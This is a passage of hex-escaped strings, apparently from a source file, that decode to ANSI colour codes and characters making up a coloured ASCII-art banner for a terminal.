""\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d""
""\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31""
""\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30""
""\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30""
""\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x40""
""\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x35\x3b\x33\x31""
""\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30""
""\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d""
""\x38\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x32\x6d\x38\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b""
""\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x40\x1b\x5b""
""\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x31\x3b\x33\x30""
""\x3b\x34\x37\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x40\x58\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d""
""\x3a\x20\x2e\x25\x3b\x2e\x2e\x25\x3b\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34""
""\x31\x6d\x38\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35""
""\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40""
""\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34""
""\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31""
""\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38""
""\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b""
""\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b""
""\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x38\x1b\x5b""
""\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d""
""\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31""
""\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40""
""\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x2e\x1b\x5b\x30\x3b\x31\x3b""
""\x33\x30\x3b\x34\x37\x6d\x74\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d""
""\x38\x3a\x2e\x2e\x20\x20\x2e\x2e\x74\x2e\x20\x2e\x3b\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31""
""\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30""
""\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30""
""\x6d\x38\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b""
""\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d""
""\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33""
""\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b""
""\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b""
""\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d""
""\x38\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33""
""\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b""
""\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b""
""\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x58\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x58\x1b""
""\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x74\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x38\x25\x20\x20\x20\x2e\x20\x20""
""\x20\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x38\x1b\x5b\x30""
""\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40""
""\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30""
""\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30""
""\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d""
""\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33""
""\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x38\x1b\x5b\x30\x3b\x33\x31""
""\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38""
""\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34""
""\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35""
""\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40""
""\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x32\x3b\x34""
""\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35""
""\x3b\x33\x33\x3b\x34\x30\x6d\x3a\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30""
""\x6d\x74\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x3b\x1b\x5b\x30\x3b""
""\x35\x3b\x33\x37\x3b\x34\x37\x6d\x3a\x20\x20\x20\x20\x2e\x20\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x74\x1b\x5b\x30""
""\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30""
""\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b""
""\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b""
""\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b""
""\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b""
""\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b""
""\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b""
""\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30""
""\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b""
""\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b""
""\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30""
""\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b""
""\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b""
""\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b""
""\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x25\x1b\x5b""
""\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x37""
""\x3b\x34\x37\x6d\x40\x2e\x2e\x20\x2e\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34""
""\x30\x6d\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35""
""\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38""
""\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34""
""\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30""
""\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34""
""\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d""
""\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33""
""\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b""
""\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34""
""\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b""
""\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b""
""\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b""
""\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b""
""\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d""
""\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x31""
""\x3b\x33\x37\x3b\x34\x37\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x25\x2e\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34""
""\x37\x6d\x3b\x20\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x2e\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30""
""\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x31""
""\x6d\x38\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30""
""\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30""
""\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38""
""\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30""
""\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30""
""\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30""
""\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40""
""\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33""
""\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b""
""\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34""
""\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31""
""\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d""
""\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33""
""\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b""
""\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30""
""\x3b\x34\x37\x6d\x58\x38\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x3a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d""
""\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33""
""\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38""
""\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x58\x1b\x5b\x30\x3b\x35""
""\x3b\x33\x33\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30""
""\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b""
""\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b""
""\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30""
""\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30""
""\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31""
""\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30""
""\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30""
""\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b""
""\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58""
""\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34""
""\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35""
""\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38""
""\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30""
""\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x38\x1b""
""\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b""
""\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x38\x1b""
""\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33""
""\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x58""
""\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b""
""\x33\x32\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d""
